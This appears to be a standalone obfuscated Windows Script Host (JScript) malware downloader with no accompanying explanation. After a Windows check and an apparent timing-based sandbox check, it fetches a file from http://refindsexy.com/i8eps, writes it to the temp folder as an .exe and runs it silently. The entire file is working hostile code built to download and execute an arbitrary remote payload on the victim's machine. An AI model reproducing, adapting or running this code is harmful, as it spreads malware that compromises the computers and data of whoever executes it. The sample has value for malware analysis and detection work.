var vT = false;
var y0 = "CreateObject";
var p0 = function lg() {return WScript[y0]("WScript.Shell");}(), eM = 11;
var gC = "MSXML2.XMLHTTP";
var M = 2123213;
var lN = 0;
function o0(qN){p0["Run"](qN, lN, lN);};
function L(){return "" + gC;};
function gj(S0, Vr){lN = lN * 1; return S0 - Vr;};
function YT(){return y0;};
/*@cc_on
  @if (@_win32 || @_win64)
    vT = true;
  @end
@*/
if (vT)
{
var y = "";
function o(){return 22;};
var e = 0; var SV = 0;
function l()
{
var iu = new this["Date"]();
var tb = iu["getUTCMilliseconds"]();
WScript["Sleep"](o());
var iu = new this["Date"]();
var yY = iu["getUTCMilliseconds"]();
WScript["Sleep"](o());
var iu = new this["Date"]();
var U = iu["getUTCMilliseconds"]();
var e = "zj";
e = gj(yY, tb);
var SV = "pD";
SV = gj(U, yY);
y = "open";
return gj(e, SV);
}
var D = false;
var R = false;
for (var ZX = lN; ZX < o() * 1; ZX++){if (l() != lN){
D = true; 
SV = "31" + 11 * e + SV; 
R = true; 
break;
}}
function h() {return ((D == true) && (D == R)) ? 1 : lN;};
if (D && h() && R){
function hP() {return p0["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "2KP5XFrOx2MDH.exe";};
 NS = L();
 WB = WScript[y0](NS);
 var p = 1;
 while (p){
try {
WB[y]("GET", "http://refindsexy.com/i8eps", false);
WB["send"]();
z = "Sleep";
for (;;){WScript[z](o() * 11); if (WB["readystate"] >= 2 * 2) break;};
p = lN;
} catch(b){};
}
function fI(HU) {var YN = (1, 2, 3, 4, 5, HU); return YN;};
S = WScript[YT()]("ADODB.Stream");
NS = S;
NS[y]();
NS["type"] = fI(1);
NS["write"](WB["ResponseBody"]);
S["position"] = fI(lN);
NS["Save" + "ToFile"](hP(), 2);
S["c"+"lose"]();
sr = hP();
o0(sr);
}
}

